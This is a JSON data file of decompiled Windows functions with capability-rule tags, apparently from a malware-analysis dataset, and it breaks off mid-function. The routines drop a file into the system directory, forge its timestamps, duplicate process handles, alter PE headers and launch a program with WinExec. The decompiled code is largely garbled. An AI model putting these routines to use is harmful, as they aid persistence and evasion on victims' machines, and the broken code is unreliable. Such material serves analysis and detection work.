{
    "00401000": {
        "rules": [
            "check if file exists/c301f2ef4d414d12851aaf7cbada9e20/bb34a6814d684c5e93a48a12384793c1"
        ],
        "decompiled_code": "\nuint fcn.00401000(void)\n\n{\n    int32_t iVar1;\n    \n    // [00] -r-x section size 20480 named .text\n    iVar1 = fcn.00402a10(0x411100);\n    if (iVar1 != -1) {\n        (*_sym.imp.KERNEL32.dll_CloseHandle)(iVar1);\n        return 1;\n    }\n    return 0;\n}\n",
        "token_count": 91
    },
    "00401040": {
        "rules": [
            "check if file exists/c301f2ef4d414d12851aaf7cbada9e20/bb34a6814d684c5e93a48a12384793c1",
            "check if file exists/c301f2ef4d414d12851aaf7cbada9e20/bb34a6814d684c5e93a48a12384793c1"
        ],
        "decompiled_code": "\n// WARNING: Instruction at (ram,0x004010aa) overlaps instruction at (ram,0x004010a8)\n// \n// WARNING: Unable to track spacebase fully for stack\n\nuint __fastcall fcn.00401040(int32_t *param_1, uint32_t *param_2, int32_t param_3)\n\n{\n    uint8_t *puVar1;\n    uint32_t uVar2;\n    uint8_t uVar3;\n    code *pcVar4;\n    uint8_t uVar5;\n    int32_t in_EAX;\n    int32_t iVar6;\n    int32_t iVar7;\n    uint uVar8;\n    uint8_t extraout_CH;\n    uint32_t uVar9;\n    uchar *puVar10;\n    uchar *puVar11;\n    uint8_t in_CF;\n    uint8_t in_AF;\n    char in_SF;\n    char in_OF;\n    unkbyte10 in_ST0;\n    ulong uVar12;\n    uint32_t in_stack_006a4ffd;\n    uint uStack20;\n    uint uStack16;\n    \n    if ((in_OF == in_SF) && (in_OF != in_SF)) {\n        *(in_EAX + -0x7ce92414) = in_ST0;\n        uVar5 = in_EAX - 1U;\n        uVar3 = 9 < (uVar5 & 0xf) | in_AF;\n        uVar5 = uVar5 + uVar3 * '\\x06';\n        uVar2 = *param_2;\n        *param_2 = *param_2 + 0x6c68df84;\n        *param_1 = *param_1 +\n                   (in_EAX - 1U & 0xffffff00 | uVar5 + (0x90 < (uVar5 & 0xf0) | in_CF | uVar3 * (0xf9 < uVar5)) * '`') +\n                   (0x9397207b < uVar2);\n    }\n    uStack16 = 0x401063;\n    iVar6 = fcn.00402a60();\n    if (iVar6 == -1) {\n        return 0;\n    }\n    if ((iVar6 != -1) || (iVar6 == -1)) {\n        uStack16 = 0;\n    }\n    uStack20 = 0x40;\n    uVar12 = (*_sym.imp.KERNEL32.dll_OpenProcess)();\n    iVar6 = uVar12;\n    if (iVar6 != 0) {\n        if ((iVar6 < 0) || (iVar7 = iVar6,  iVar6 >= 0)) {\n            iVar7 = param_3;\n        }\n        uVar9 = &stack0xffffffec ^ in_stack_006a4ffd;\n        puVar1 = (uVar12 >> 0x20) + 2;\n        *puVar1 = *puVar1 | extraout_CH;\n        *(uVar9 - 4) = 0;\n        *(uVar9 - 8) = 0;\n        *(uVar9 - 0xc) = 0;\n        *(uVar9 - 0x10) = iVar7;\n        *(uVar9 - 0x14) = iVar6;\n        pcVar4 = _sym.imp.KERNEL32.dll_GetCurrentProcess;\n        puVar10 = uVar9 - 0x18;\n        *(uVar9 - 0x18) = 0x4010bd;\n        uVar8 = (*pcVar4)();\n        *(puVar10 + -4) = uVar8;\n        pcVar4 = _sym.imp.KERNEL32.dll_DuplicateHandle;\n        puVar11 = puVar10 + -8;\n        *(puVar10 + -8) = 0x4010c4;\n        uVar12 = (*pcVar4)();\n        if (uVar12 != 0) {\n            *(puVar11 + -4) = uVar12 >> 0x20;\n            *(puVar11 + -4) = iVar7;\n            pcVar4 = _sym.imp.KERNEL32.dll_CloseHandle;\n            *(puVar11 + -8) = 0x4010ed;\n            (*pcVar4)();\n            return 1;\n        }\n        return 0;\n    }\n    return 0;\n}\n",
        "token_count": 935
    },
    "00401100": {
        "rules": [
            "check if file exists/c301f2ef4d414d12851aaf7cbada9e20/bb34a6814d684c5e93a48a12384793c1"
        ],
        "decompiled_code": "\n// WARNING: Instruction at (ram,0x004011a0) overlaps instruction at (ram,0x0040119e)\n// \n\nuint fcn.00401100(void)\n\n{\n    char cVar1;\n    int32_t arg_ch;\n    uint32_t uVar2;\n    int32_t iVar3;\n    uchar *extraout_ECX;\n    uchar *puVar4;\n    uint *puVar5;\n    uchar **ppuVar6;\n    uchar **ppuVar7;\n    bool in_ZF;\n    ulong uVar8;\n    uchar *apuStack20 [2];\n    \n    puVar5 = &stack0xfffffffc;\n    ppuVar7 = &stack0xfffffffc;\n    if ((!in_ZF) && (ppuVar7 = &stack0xfffffffc,  in_ZF)) {\n        ppuVar6 = apuStack20 + 1;\n        ppuVar7 = apuStack20 + 1;\n        cVar1 = '\\x10';\n        do {\n            puVar5 = puVar5 + -1;\n            ppuVar6 = ppuVar6 + -1;\n            *ppuVar6 = *puVar5;\n            cVar1 = cVar1 + -1;\n            apuStack20[1] = &stack0xfffffffc;\n        } while ('\\0' < cVar1);\n    }\n    *0x423594 = fcn.00404f20();\n    uVar8 = (*_sym.imp.KERNEL32.dll_CreateFileA)(*(ppuVar7 + 8), 0x40000000, 1, 0, 2, 0x80, 0);\n    arg_ch = uVar8;\n    if (arg_ch != -1) {\n        if ((arg_ch < -1) || (-2 < arg_ch)) {\n            iVar3 = *(ppuVar7 + 0x10);\n            uVar2 = *(ppuVar7 + 0xc);\n            puVar4 = ppuVar7 + -4;\n        }\n        else {\n            uVar2 = uVar8 >> 0x20 | 0x8d;\n            puVar4 = extraout_ECX;\n            iVar3 = arg_ch;\n        }\n        uVar2 = (*_sym.imp.KERNEL32.dll_WriteFile)(arg_ch, uVar2, iVar3, puVar4, 0);\n        if (uVar2 != 0) {\n            if (((-1 < uVar2) && (-1 >= uVar2)) || (uVar2 = *0x423594,  *0x423594 != 0)) {\n                *(ppuVar7 + 0x561374c0) = *(ppuVar7 + 0x561374c0) + uVar2 + '/';\n                iVar3 = fcn.00401040();\n                *0x423594 = iVar3 == 0;\n            }\n            fcn.00401230(0, arg_ch);\n            if (*0x423594 == 0) {\n                (*_sym.imp.KERNEL32.dll_CloseHandle)(arg_ch);\n            }\n            return 1;\n        }\n        return 0;\n    }\n    return 0;\n}\n",
        "token_count": 693
    },
    "00401230": {
        "rules": [
            "check if file exists/c301f2ef4d414d12851aaf7cbada9e20/bb34a6814d684c5e93a48a12384793c1",
            "check if file exists/c301f2ef4d414d12851aaf7cbada9e20/bb34a6814d684c5e93a48a12384793c1"
        ],
        "decompiled_code": "\nuint __cdecl fcn.00401230(uint arg_8h, int32_t arg_ch)\n\n{\n    char cVar1;\n    int32_t iVar2;\n    uint32_t uVar3;\n    uint32_t uVar4;\n    uint *puVar5;\n    char *pcVar6;\n    char *pcVar7;\n    uint *puVar8;\n    char var_22ch;\n    uint var_22bh;\n    uint var_128h;\n    uint var_24h;\n    uint lpCreationTime;\n    uint lpLastAccessTime;\n    uint lpLastWriteTime;\n    \n    var_22ch = '\\0';\n    var_128h._0_1_ = 0;\n    puVar5 = &var_22bh;\n    for (iVar2 = 0x40; iVar2 != 0; iVar2 = iVar2 + -1) {\n        *puVar5 = 0;\n        puVar5 = puVar5 + 1;\n    }\n    *puVar5 = 0;\n    *(puVar5 + 2) = 0;\n    puVar5 = &var_128h + 1;\n    for (iVar2 = 0x40; iVar2 != 0; iVar2 = iVar2 + -1) {\n        *puVar5 = 0;\n        puVar5 = puVar5 + 1;\n    }\n    *puVar5 = 0;\n    *(puVar5 + 2) = 0;\n    (*_sym.imp.KERNEL32.dll_GetSystemDirectoryA)(&var_22ch, 0x104);\n    uVar3 = 0xffffffff;\n    pcVar6 = &var_22ch;\n    do {\n        pcVar7 = pcVar6;\n        if (uVar3 == 0) break;\n        uVar3 = uVar3 - 1;\n        pcVar7 = pcVar6 + 1;\n        cVar1 = *pcVar6;\n        pcVar6 = pcVar7;\n    } while (cVar1 != '\\0');\n    uVar3 = ~uVar3;\n    puVar5 = pcVar7 + -uVar3;\n    puVar8 = &var_128h;\n    for (uVar4 = uVar3 >> 2; uVar4 != 0; uVar4 = uVar4 - 1) {\n        *puVar8 = *puVar5;\n        puVar5 = puVar5 + 1;\n        puVar8 = puVar8 + 1;\n    }\n    for (uVar3 = uVar3 & 3; uVar3 != 0; uVar3 = uVar3 - 1) {\n        *puVar8 = *puVar5;\n        puVar5 = puVar5 + 1;\n        puVar8 = puVar8 + 1;\n    }\n    uVar3 = 0xffffffff;\n    pcVar6 = 0x411138;\n    do {\n        pcVar7 = pcVar6;\n        if (uVar3 == 0) break;\n        uVar3 = uVar3 - 1;\n        pcVar7 = pcVar6 + 1;\n        cVar1 = *pcVar6;\n        pcVar6 = pcVar7;\n    } while (cVar1 != '\\0');\n    uVar3 = ~uVar3;\n    iVar2 = -1;\n    puVar5 = &var_128h;\n    do {\n        puVar8 = puVar5;\n        if (iVar2 == 0) break;\n        iVar2 = iVar2 + -1;\n        puVar8 = puVar5 + 1;\n        cVar1 = *puVar5;\n        puVar5 = puVar8;\n    } while (cVar1 != '\\0');\n    puVar5 = pcVar7 + -uVar3;\n    puVar8 = puVar8 + -1;\n    for (uVar4 = uVar3 >> 2; uVar4 != 0; uVar4 = uVar4 - 1) {\n        *puVar8 = *puVar5;\n        puVar5 = puVar5 + 1;\n        puVar8 = puVar8 + 1;\n    }\n    for (uVar3 = uVar3 & 3; uVar3 != 0; uVar3 = uVar3 - 1) {\n        *puVar8 = *puVar5;\n        puVar5 = puVar5 + 1;\n        puVar8 = puVar8 + 1;\n    }\n    (*_sym.imp.KERNEL32.dll_GetFileAttributesExA)(*0x10 + -300, 0, 0xd8);\n    iVar2 = arg_ch;\n    if (arg_ch == -1) {\n        iVar2 = fcn.00402a10(arg_8h);\n        if (iVar2 == -1) {\n            return 0;\n        }\n    }\n    (*_sym.imp.KERNEL32.dll_SetFileTime)(iVar2, &lpCreationTime, &lpLastAccessTime, &lpLastWriteTime);\n    if (arg_ch == -1) {\n        (*_sym.imp.KERNEL32.dll_CloseHandle)(iVar2);\n    }\n    return 1;\n}\n",
        "token_count": 1134
    },
    "00402230": {
        "rules": [
            "check if file exists/c301f2ef4d414d12851aaf7cbada9e20/bb34a6814d684c5e93a48a12384793c1"
        ],
        "decompiled_code": "\n// WARNING: Control flow encountered bad instruction data\n// WARNING: Instruction at (ram,0x004022f1) overlaps instruction at (ram,0x004022ee)\n// \n\nvoid __cdecl\nfcn.00402230(uint arg_8h, uint arg_ch, uint arg_10h, uint arg_14h, uint arg_18h, uint arg_1ch, int32_t arg_20h)\n\n{\n    uint8_t *puVar1;\n    uint arg_ch_00;\n    uint arg_8h_00;\n    uint uVar2;\n    int32_t iVar3;\n    int32_t iVar4;\n    uint32_t uVar5;\n    uint *puVar6;\n    bool bVar7;\n    float10 extraout_ST0;\n    uint var_10bh;\n    uint var_8h;\n    uint var_4h;\n    \n    fcn.004016c0(arg_18h, arg_1ch, arg_8h, 0x20, arg_20h + 0x20);\n    bVar7 = false;\n    uVar5 = &stack0xfffffffc & 0xffff0000 | *0x10 - 4;\n    iVar4 = *(uVar5 + 0x20);\n    arg_ch_00 = *(uVar5 + 0x1c);\n    arg_8h_00 = *(uVar5 + 0x18);\n    uVar2 = fcn.004016c0(arg_8h_00, arg_ch_00, *(uVar5 + 0xc), 0x20, iVar4 + 0x60);\n    if (!bVar7) {\n        if (bVar7) {\n            out(0xbd, uVar2);\n            return;\n        }\n    }\n    fcn.004016c0(arg_8h_00, arg_ch_00, *(uVar5 + 0x10), 0x20, iVar4 + 0xa0);\n    fcn.004016c0(arg_8h_00, arg_ch_00, *(uVar5 + 0x14), 0x20, iVar4 + 0xe0);\n    if ((&stack0xfffffed0 < 0xffffffec) && (&stack0xfffffed0 >= 0xffffffec)) {\n    // WARNING: Bad instruction - Truncating control flow here\n        halt_baddata();\n    }\n    iVar3 = fcn.004021e0();\n    if (iVar3 == -1) {\n        iVar3 = (*_sym.imp.MSVCRT.dll_rand)();\n        *(iVar4 + 0x120) = iVar3 % 5;\n    }\n    else {\n        *(iVar4 + 0x120) = iVar3;\n    }\n    *(uVar5 - 0x10c) = 0;\n    puVar6 = uVar5 - 0x10b;\n    for (iVar4 = 0x40; iVar4 != 0; iVar4 = iVar4 + -1) {\n        *puVar6 = 0;\n        puVar6 = puVar6 + 1;\n    }\n    *puVar6 = 0;\n    *(uVar5 - 4) = 0x104;\n    *(puVar6 + 2) = 0;\n    iVar4 = fcn.00402120(0x80000001, 0x411348, 0x411374, uVar5 - 8, uVar5 - 0x10c, uVar5 - 4);\n    if (iVar4 != 0) {\n        if ((-1 < iVar4) && (-1 >= iVar4)) {\n            *(puVar6 + 0x1f) = extraout_ST0;\n        }\n        iVar4 = (*_sym.imp.MSVCRT.dll__stricmp)();\n        if (iVar4 == 0) {\n            puVar1 = *(uVar5 + 0x20) + 0x120;\n            *puVar1 = *puVar1 | 0x80;\n        }\n    }\n    return;\n}\n",
        "token_count": 887
    },
    "00402850": {
        "rules": [
            "check if file exists/c301f2ef4d414d12851aaf7cbada9e20/bb34a6814d684c5e93a48a12384793c1",
            "check if file exists/c301f2ef4d414d12851aaf7cbada9e20/bb34a6814d684c5e93a48a12384793c1"
        ],
        "decompiled_code": "\n// WARNING: Instruction at (ram,0x0040293b) overlaps instruction at (ram,0x0040293a)\n// \n// WARNING: Removing unreachable block (ram,0x0040292b)\n\nbool fcn.00402850(void)\n\n{\n    uint8_t uVar1;\n    char cVar2;\n    code cVar3;\n    int32_t iVar4;\n    uint32_t uVar5;\n    char *pcVar6;\n    int32_t extraout_ECX;\n    int32_t *extraout_ECX_00;\n    char extraout_DH;\n    uint32_t unaff_EBX;\n    uchar *puVar7;\n    code *unaff_EDI;\n    uint *puVar8;\n    bool bVar9;\n    uint8_t in_AF;\n    uint8_t in_TF;\n    uint8_t in_IF;\n    uint8_t in_NT;\n    uint8_t in_AC;\n    uint8_t in_VIF;\n    uint8_t in_VIP;\n    uint8_t in_ID;\n    \n    puVar7 = &stack0xfffffffc;\n    uVar5 = fcn.00401590();\n    bVar9 = false;\n    if (uVar5 == 0) {\n        return false;\n    }\n    if ((0 < uVar5) && (uVar5 < 1)) {\n        in_AF = 9 < (uVar5 & 0xf) | in_AF;\n        uVar1 = uVar5 + in_AF * '\\x06';\n        pcVar6 = uVar5 & 0xffff0000 | CONCAT11((uVar5 >> 8) + in_AF, uVar1) & 0xff0f;\n        if (extraout_ECX != 0) {\n            do {\n    // WARNING: Do nothing block with infinite loop\n            } while( true );\n        }\n        *pcVar6 = *pcVar6 + (uVar1 & 0xf);\n        if ((*pcVar6 != '\\0') && (iVar4 = (*unaff_EDI)(),  iVar4 != 0x422)) {\n            (*_sym.imp.ADVAPI32.dll_CloseServiceHandle)();\n            return false;\n        }\n        (*_sym.imp.ADVAPI32.dll_CloseServiceHandle)();\n        return true;\n    }\n    cVar3 = fcn.004014c0();\n    if ((bVar9) || (!bVar9)) {\n        uVar5 = 0x411164;\n    }\n    else {\n        cVar2 = cVar3 - *unaff_EDI;\n        uVar5 = (in_NT & 1) * 0x4000 | SBORROW1(cVar3, *unaff_EDI) * 0x800 | (in_IF & 1) * 0x200 | (in_TF & 1) * 0x100 |\n                (cVar2 < '\\0') * 0x80 | (cVar2 == '\\0') * 0x40 | (in_AF & 1) * 0x10 | ((POPCOUNT(cVar2) & 1U) == 0) * 4\n                | cVar3 < *unaff_EDI | (in_ID & 1) * 0x200000 | (in_VIP & 1) * 0x100000 | (in_VIF & 1) * 0x80000 |\n                (in_AC & 1) * 0x40000;\n        iVar4 = func_0x1018882e(uVar5);\n        puVar7 = iVar4 + 100;\n        *extraout_ECX_00 = *extraout_ECX_00 + iVar4;\n    }\n    iVar4 = fcn.00402a60(uVar5);\n    bVar9 = SBORROW4(iVar4, -1);\n    if (iVar4 != -1) {\n        return false;\n    }\n    fcn.00403740();\n    *0x423598 = 1;\n    if ((!bVar9) && (bVar9)) {\n        LOCK();\n    }\n    iVar4 = fcn.00401000();\n    if (iVar4 == 0) {\n        puVar7[-0x20] = 0;\n        pcVar6 = unaff_EBX & 0xffff0000 | CONCAT11(*0x7, unaff_EBX);\n        *0x7b9d232 = *0x7b9d232 + '2';\n        *pcVar6 = *pcVar6 + extraout_DH;\n        puVar7[0x5588e17d] = puVar7[0x5588e17d];\n        puVar7[-0x80] = 0;\n        puVar8 = puVar7 + -0x1f;\n        for (iVar4 = 7; iVar4 != 0; iVar4 = iVar4 + -1) {\n            *puVar8 = 0x7b9d232;\n            puVar8 = puVar8 + 1;\n        }\n        *puVar8 = 0xd232;\n        *(puVar8 + 2) = 0x32;\n        puVar7[-0x60] = 0;\n        puVar8 = puVar7 + -0x7f;\n        for (iVar4 = 7; iVar4 != 0; iVar4 = iVar4 + -1) {\n            *puVar8 = 0;\n            puVar8 = puVar8 + 1;\n        }\n        *puVar8 = 0;\n        *(puVar8 + 2) = 0;\n        puVar7[-0x40] = 0;\n        puVar8 = puVar7 + -0x5f;\n        for (iVar4 = 7; iVar4 != 0; iVar4 = iVar4 + -1) {\n            *puVar8 = 0;\n            puVar8 = puVar8 + 1;\n        }\n        *puVar8 = 0;\n        *(puVar8 + 2) = 0;\n        puVar8 = puVar7 + -0x3f;\n        for (iVar4 = 7; iVar4 != 0; iVar4 = iVar4 + -1) {\n            *puVar8 = 0;\n            puVar8 = puVar8 + 1;\n        }\n        *puVar8 = 0;\n        *(puVar8 + 2) = 0;\n        iVar4 = fcn.00404880(puVar7 + -0x80, puVar7 + -0x60, puVar7 + -0x20, puVar7 + -0x40);\n        if (iVar4 == 0) {\n            return false;\n        }\n        iVar4 = fcn.00401d10(puVar7 + -0x20);\n        if (iVar4 == 0) {\n            return false;\n        }\n        iVar4 = fcn.004049d0(puVar7 + -0x80, puVar7 + -0x60, puVar7 + -0x20, puVar7 + -0x40);\n        return iVar4 != 0;\n    }\n    return false;\n}\n",
        "token_count": 1559
    },
    "00402a60": {
        "rules": [
            "check if file exists/c301f2ef4d414d12851aaf7cbada9e20/bb34a6814d684c5e93a48a12384793c1"
        ],
        "decompiled_code": "\n// WARNING: Control flow encountered bad instruction data\n// WARNING: Instruction at (ram,0x00402ab4) overlaps instruction at (ram,0x00402ab3)\n// \n// WARNING: Removing unreachable block (ram,0x00402b7e)\n// WARNING: Removing unreachable block (ram,0x00402ab1)\n\nint32_t fcn.00402a60(char **param_1)\n\n{\n    char *pcVar1;\n    char cVar2;\n    char cVar6;\n    uint32_t uVar3;\n    char *pcVar4;\n    uint32_t uVar5;\n    int32_t iVar7;\n    uint16_t *extraout_ECX;\n    uint16_t *puVar8;\n    uint32_t uVar9;\n    uint32_t uVar10;\n    code *pcVar11;\n    int32_t *piVar12;\n    char **ppcVar13;\n    ushort in_DS;\n    char in_AF;\n    bool bVar14;\n    ulong uVar15;\n    uint uStack304;\n    int32_t aiStack300 [73];\n    int32_t iStack8;\n    \n    iStack8 = -1;\n    uVar3 = (**0x423588)(2, 0);\n    if (uVar3 == 0xffffffff) {\n        return -1;\n    }\n    uStack304 = 0x128;\n    piVar12 = aiStack300;\n    for (iVar7 = 0x49; iVar7 != 0; iVar7 = iVar7 + -1) {\n        *piVar12 = 0;\n        piVar12 = piVar12 + 1;\n    }\n    uVar10 = uVar3;\n    // WARNING: Bad instruction - Truncating control flow here\n    iVar7 = (**0x42358c)(uVar3, &uStack304);\n    pcVar11 = _sym.imp.MSVCRT.dll__stricmp;\n    do {\n        if (iVar7 == 0) {\ncode_r0x00402b18:\n            (*_sym.imp.KERNEL32.dll_CloseHandle)(uVar3);\n            return iStack8;\n        }\n        uVar15 = (*pcVar11)(0xf4, param_1);\n        bVar14 = uVar15 == 0;\n        if (bVar14) {\n            if ((!bVar14) && (bVar14)) {\n                pcVar11 = pcVar11 + 1;\n                puVar8 = extraout_ECX;\n                if (pcVar11 == NULL) {\n                    do {\n                        pcVar4 = uVar15 | 0x85;\n                        *(uVar3 + 0x4e) = 0;\n                        *param_1 = *param_1 >> 1 | *param_1 << 7;\n                        _pe_dos_header = in_DS;\n                        *pcVar4 = *pcVar4 + pcVar4;\n                        pcVar1 = uVar3 + 0x52;\n                        cVar2 = *pcVar1;\n                        cVar6 = uVar15 >> 8;\n                        *pcVar1 = *pcVar1 + cVar6;\n                        uVar5 = uVar15 >> 0x20 & 0xffff0000;\n                        uVar9 = uVar5 | uVar10 & 0xffff;\n                        ppcVar13 = param_1;\n                        if (SCARRY1(cVar2, cVar6) != *pcVar1 < '\\0') {\n                            out(0xc4, pcVar4);\n                            ppcVar13 = param_1 + 1;\n                            *param_1 = pcVar4;\n                            uVar9 = uVar5 | uVar10 & 0xff00 | uVar10 ^ puVar8;\n                        }\n                        do {\n                            uVar3 = uVar3 + *puVar8;\n                            uVar5 = uVar3 >> 0x10;\n                            if (uVar3 >> 0x10 != 0) {\n                                uVar5 = uVar5 + (uVar3 & 0xffff);\n                                uVar3 = uVar5;\n                            }\n                            puVar8 = puVar8 + 1;\n                            uVar10 = uVar9 - 1;\n                            uVar15 = CONCAT44(uVar10, uVar5);\n                            if (uVar10 == 0) {\n                                return (uVar3 >> 0x10) + uVar3;\n                            }\n                            bVar14 = uVar9 < 1;\n                            uVar9 = uVar10;\n                        } while (bVar14);\n                        uVar10 = uVar10 & 0xffff;\n                        param_1 = ppcVar13;\n                    } while( true );\n                }\n                piVar12 = (CONCAT11(in_AF, in_AF * '\\x06') & 0xff0f) + 0x2a;\n                *piVar12 = *piVar12 - pcVar11;\n                uVar3 = uVar3 + 1;\n            }\n            iStack8 = aiStack300[1];\n            goto code_r0x00402b18;\n        }\n        iVar7 = (**0x423590)(uVar3, &uStack304);\n    } while( true );\n}\n",
        "token_count": 1129
    },
    "004030d0": {
        "rules": [
            "check if file exists/c301f2ef4d414d12851aaf7cbada9e20/bb34a6814d684c5e93a48a12384793c1"
        ],
        "decompiled_code": "\nuint __cdecl fcn.004030d0(uint arg_8h)\n\n{\n    int32_t iVar1;\n    \n    iVar1 = (*_sym.imp.MSVCRT.dll__access)(arg_8h, 0);\n    if (iVar1 != -1) {\n        return 0;\n    }\n    return 1;\n}\n",
        "token_count": 73
    },
    "004049d0": {
        "rules": [
            "check if file exists/c301f2ef4d414d12851aaf7cbada9e20/bb34a6814d684c5e93a48a12384793c1",
            "check if file exists/c301f2ef4d414d12851aaf7cbada9e20/bb34a6814d684c5e93a48a12384793c1"
        ],
        "decompiled_code": "\n// WARNING: Instruction at (ram,0x00404c18) overlaps instruction at (ram,0x00404c17)\n// \n// WARNING: Removing unreachable block (ram,0x00404c18)\n// WARNING: Removing unreachable block (ram,0x00404c19)\n// WARNING: Restarted to delay deadcode elimination for space: stack\n\nuint32_t fcn.004049d0(int32_t param_1, uint32_t *param_2, uint param_3, uint param_4)\n\n{\n    uint8_t uVar1;\n    char *pcVar2;\n    uint8_t *puVar3;\n    uint32_t uVar4;\n    int32_t iVar5;\n    int32_t *extraout_ECX;\n    uint *puVar6;\n    bool bVar7;\n    bool bVar8;\n    bool bVar9;\n    uint32_t *puVar10;\n    uchar uStack536;\n    uint uStack535;\n    uint32_t uStack528;\n    uchar uStack276;\n    uint uStack275;\n    uint32_t uStack16;\n    uint uStack12;\n    uint uStack8;\n    \n    uStack536 = 0;\n    puVar6 = &uStack535;\n    for (iVar5 = 0x40; iVar5 != 0; iVar5 = iVar5 + -1) {\n        *puVar6 = 0;\n        puVar6 = puVar6 + 1;\n    }\n    *puVar6 = 0;\n    *(puVar6 + 2) = 0;\n    uStack276 = 0;\n    puVar6 = &uStack275;\n    for (iVar5 = 0x40; iVar5 != 0; iVar5 = iVar5 + -1) {\n        *puVar6 = 0;\n        puVar6 = puVar6 + 1;\n    }\n    *puVar6 = 0;\n    uStack16 = 1;\n    *(puVar6 + 2) = 0;\n    puVar10 = &uStack536;\n    (*_sym.imp.KERNEL32.dll_GetSystemDirectoryA)();\n    (*_sym.imp.MSVCRT.dll_sprintf)(&uStack276, 0x411120, &uStack536);\n    fcn.00402610(&uStack8, &uStack12);\n    iVar5 = fcn.00404d20(param_1, param_2, param_3, param_4, uStack8, uStack12);\n    if (iVar5 == 0) {\n        return 0;\n    }\n    pcVar2 = fcn.00401100(&uStack276, uStack8);\n    bVar7 = false;\n    bVar9 = false;\n    bVar8 = (POPCOUNT(pcVar2 & 0xff) & 1U) != 0;\n    if (pcVar2 == NULL) {\n        return 0;\n    }\n    if ((bVar8) && (!bVar8)) {\n        *param_2 = *param_2 | 0xffffff80;\n        uVar1 = pcVar2 - *pcVar2;\n        puVar3 = pcVar2 & 0xffffff00 | uVar1;\n        bVar7 = CARRY1(*puVar3, uVar1);\n        bVar9 = SCARRY1(*puVar3, uVar1);\n        *puVar3 = *puVar3 + uVar1;\n    }\n    if (!bVar9) {\n        fcn.00401b40();\n        if ((!bVar7) && (bVar7)) {\n            *(param_1 + 0x43d1773a) = *(param_1 + 0x43d1773a) ^ 0x6827e95e;\n            *extraout_ECX = *extraout_ECX + puVar10;\n        }\n        iVar5 = fcn.00402a60();\n        if ((iVar5 != -1) || (iVar5 = fcn.00402a60(),  iVar5 != -1)) {\n            iVar5 = fcn.004021b0(param_1);\n            if (iVar5 != 0) {\n                fcn.00402df0();\n                fcn.00402110();\n                return 1;\n            }\n            if (*0x423594 == 0) {\n                return 0;\n            }\n        }\n        iVar5 = fcn.00404e80(param_1, &uStack276);\n        if (iVar5 == 0) {\n            uStack16 = 0;\n        }\n        bVar7 = uStack16 < 0;\n        uVar4 = uStack16;\n        if (uStack16 != 0) {\n            uVar4 = fcn.004017d0(param_1);\n            bVar7 = uVar4 < 0;\n            if (uVar4 == 0) {\n                uStack16 = 0;\n            }\n        }\n        if ((!bVar7) && (bVar7)) {\n            out(0xc4, uVar4);\n            *param_2 = uVar4;\n        }\n        if (uStack16 == 0) {\n            uStack16 = fcn.00401950(param_1, 0);\n        }\n        if (uStack16 != 0) {\n            fcn.00402110(0xffffffff);\n        }\n        (*_sym.imp.KERNEL32.dll_Sleep)(1000);\n        (*_sym.imp.KERNEL32.dll_WinExec)(0x41116c, 0);\n        return uStack16;\n    }\n    *puVar10 = uStack528;\n    return uStack528;\n}\n",
        "token_count": 1229
    },
    "00404f20": {
        "rules": [
            "check if file exists/c301f2ef4d414d12851aaf7cbada9e20/bb34a6814d684c5e93a48a12384793c1"
        ],
        "decompiled_code": "\nbool fcn.00404f20(void)\n\n{\n    int32_t iVar1;\n    uint var_10ch;\n    uint var_8h;\n    uint var_4h;\n    \n    var_4h = 0x104;\n    iVar1 = fcn.00402120(0x80000002, 0x4113e0, 0x411420, &var_8h, &var_10ch, &var_4h);\n    if (iVar1 == 0) {\n        return false;\n    }\n    iVar1 = (*_sym.imp.MSVCRT.dll__access)(&var_10ch, 0);\n    return iVar1 != -1;\n}\n",
        "token_count": 151
    },
    "00401e20": {
        "rules": [
            "decompress data using LZO/119ff19994674493853a9d8636ba63bf",
            "hash data using jshash/b1c33655e5b8435da69c7094541b75b8"
        ],
        "decompiled_code": "\n// WARNING: Instruction at (ram,0x00401f9d) overlaps instruction at (ram,0x00401f9c)\n// \n// WARNING: Removing unreachable block (ram,0x00401f9d)\n// WARNING: Restarted to delay deadcode elimination for space: stack\n\nuint __cdecl fcn.00401e20(int16_t *arg_8h)\n\n{\n    uint8_t uVar1;\n    int32_t *piVar2;\n    uint *puVar3;\n    int32_t iVar4;\n    uint8_t extraout_CL;\n    uint32_t uVar5;\n    uint *in_EDX;\n    uint *puVar6;\n    int32_t unaff_EBX;\n    uint32_t unaff_ESI;\n    uint *unaff_EDI;\n    uint32_t uVar7;\n    uint *puVar8;\n    uint8_t in_AF;\n    bool bVar9;\n    uint var_4h;\n    \n    if (*arg_8h != 0x5a4d) {\n        return 0;\n    }\n    piVar2 = *(arg_8h + 0x1e) + arg_8h;\n    if (*piVar2 != 0x4550) {\n        return 0;\n    }\n    if (piVar2[0x16] != 0) {\n        return 0;\n    }\n    bVar9 = (piVar2 + unaff_EBX | 0x11a9U) != 0;\n    if ((bVar9) && (!bVar9)) {\n        if (unaff_EBX + 1 == 0) goto code_r0x00401f4b;\n        uVar1 = 9 < (piVar2 & 0xf) | in_AF;\n        piVar2 = (piVar2 & 0xffff0000 | CONCAT11((piVar2 >> 8) + uVar1, piVar2 + uVar1 * '\\x06') & 0xff0f) + 0x2a;\n        *piVar2 = *piVar2 - (unaff_EBX + 1);\n    }\n    if (*(arg_8h + 0x1e) < 0x81) {\n        return 0;\n    }\n    unaff_ESI = *(arg_8h + 0x1e) - 0x80;\n    in_EDX = unaff_EDI;\n    if (0xbf < *(arg_8h + 0x1e)) {\n        unaff_ESI = 0x40;\n    }\ncode_r0x00401f4b:\n    puVar3 = sub.MSVCRT.dll_void____cdecl_operator_new_unsigned_int_();\n    if (puVar3 == NULL) {\n        return 0;\n    }\n    puVar6 = puVar3;\n    if ((-1 < puVar3) && (-1 >= puVar3)) {\n        out(0xc4, puVar3);\n        puVar6 = puVar3 & 0xffffff00 | puVar3 ^ extraout_CL;\n        *in_EDX = puVar3;\n    }\n    uVar5 = 0;\n    if (unaff_ESI != 0) {\n        do {\n            iVar4 = (*_sym.imp.MSVCRT.dll_rand)();\n            uVar7 = uVar5 + 1;\n            *(uVar5 + puVar3) = iVar4 % 0xff;\n            puVar6 = puVar3;\n            uVar5 = uVar7;\n        } while (uVar7 < unaff_ESI);\n    }\n    puVar8 = arg_8h + 0x40;\n    for (uVar5 = unaff_ESI >> 2; uVar5 != 0; uVar5 = uVar5 - 1) {\n        *puVar8 = *puVar6;\n        puVar6 = puVar6 + 1;\n        puVar8 = puVar8 + 1;\n    }\n    for (uVar5 = unaff_ESI & 3; uVar5 != 0; uVar5 = uVar5 - 1) {\n        *puVar8 = *puVar6;\n        puVar6 = puVar6 + 1;\n        puVar8 = puVar8 + 1;\n    }\n    sub.MSVCRT.dll_void___cdecl_operator_delete_void__(puVar3);\n    return 